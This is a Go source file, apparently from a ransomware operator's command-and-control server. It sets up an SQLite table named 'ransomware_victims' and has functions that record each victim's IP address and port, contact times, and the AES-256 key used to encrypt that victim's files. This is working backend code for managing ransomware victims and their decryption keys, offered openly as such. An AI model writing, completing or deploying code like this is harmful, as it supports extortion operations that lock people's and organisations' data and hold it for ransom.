package utilities

import (
	"database/sql"
	"log"
	"os"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

type ransomwareVictims struct {
	IPAndPort              string
	EncryptionKeyAES256Hex string
	FirstContactTimestamp  time.Time
	LastContactTimestamp   time.Time
}

// SetupDatabase initializes the database and creates the table if it doesn't exist
func SetupDatabase() (*sql.DB, error) {
	sqlite3DBFilePath := os.Getenv("SQLITE3_FILEPATH")
	if sqlite3DBFilePath == "" {
		log.Panicf("SQLITE3_FILEPATH environment variable not set")
	}

	db, err := sql.Open("sqlite3", sqlite3DBFilePath)
	if err != nil {
		return nil, err
	}

	// Create a new table in the database to store the victims' data
	generateTableQuery := `
		CREATE TABLE IF NOT EXISTS ransomware_victims (
			Id INTEGER PRIMARY KEY AUTOINCREMENT,
			IpAndPort VARCHAR(64) NOT NULL,
			EncryptionKeyAES256Hex VARCHAR(64),
			FirstContactTimestamp TIMESTAMP,
			LastContactTimestamp TIMESTAMP
		);`

	_, err = db.Exec(generateTableQuery)
	if err != nil {
		return nil, err
	}

	return db, nil
}

// RegisterVictim inserts victim data into the database
func RegisterVictim(dbConnection *sql.DB, ipAndPort string, firstContactTimestamp time.Time, lastContactTimestamp time.Time) {
	query := `
		INSERT INTO ransomware_victims (IpAndPort, FirstContactTimestamp, LastContactTimestamp)
		VALUES ($1, $2, $3);`
	_, err := dbConnection.Exec(query, ipAndPort, firstContactTimestamp, lastContactTimestamp)
	if err != nil {
		log.Printf("Error inserting victim data: %v", err)
	}
}

// RegisterVictimAES256Key updates the victim's data with the AES key and last contact timestamp
func RegisterVictimAES256Key(dbConnection *sql.DB, ipAndPort string, encryptionKeyAES256Hex string, lastContactTimestamp time.Time) {
	query := `
		UPDATE ransomware_victims
		SET EncryptionKeyAES256Hex = $1, LastContactTimestamp = $2
		WHERE IpAndPort = $3;`

	_, err := dbConnection.Exec(query, encryptionKeyAES256Hex, lastContactTimestamp, ipAndPort)
	if err != nil {
		log.Printf("Error updating victim data: %v", err)
	}
}
